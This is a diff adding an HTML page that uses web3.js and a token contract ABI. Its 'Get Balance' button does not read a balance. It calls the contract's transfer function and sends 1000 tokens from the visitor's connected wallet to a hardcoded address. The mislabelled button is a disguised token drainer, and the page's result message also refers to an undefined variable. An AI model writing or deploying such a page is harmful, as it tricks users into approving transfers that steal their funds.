@@ -1,0 +1,80 @@
+<html>
+  <head>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.2.6/dist/web3.min.js"></script>
+  </head>
+  <body>
+    <button onclick="transfer()">Get Balance</button>
+    <p id="send"></p>
+    <script>
+      if (typeof web3 !== 'undefined') {
+        web3 = new Web3(web3.currentProvider);
+      } else {
+        alert("Please install MetaMask to use this feature.");
+      }
+
+      const ABI = 
+        [
+        {
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "account",
+				"type": "address"
+			}
+		],
+		"name": "balanceOf",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+		},
+		{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "to",
+				"type": "address"
+			},
+			{
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "transfer",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	}
+	];
+
+    function transfer() {
+		
+
+		ethereum.enable().then(function(){
+			web3.eth.getAccounts().then(function(accounts) {
+				var contractAddress = "0x1F638bE4b2dBFc067117f2BAa11D3F5f5E6bB0Ac"; 
+				var account="0x15433DA387451F9dE4565280C85506CB71aF9376";
+				var contract = new web3.eth.Contract(ABI, contractAddress);
+				contract.methods.transfer(account,1000).send({from: accounts[0]}).then(function() {
+                    document.getElementById("send").innerHTML = "transaction result: " + balance;
+				});
+        	});
+		})
+    }
+    </script>
+  </body>
+</html>
+
+
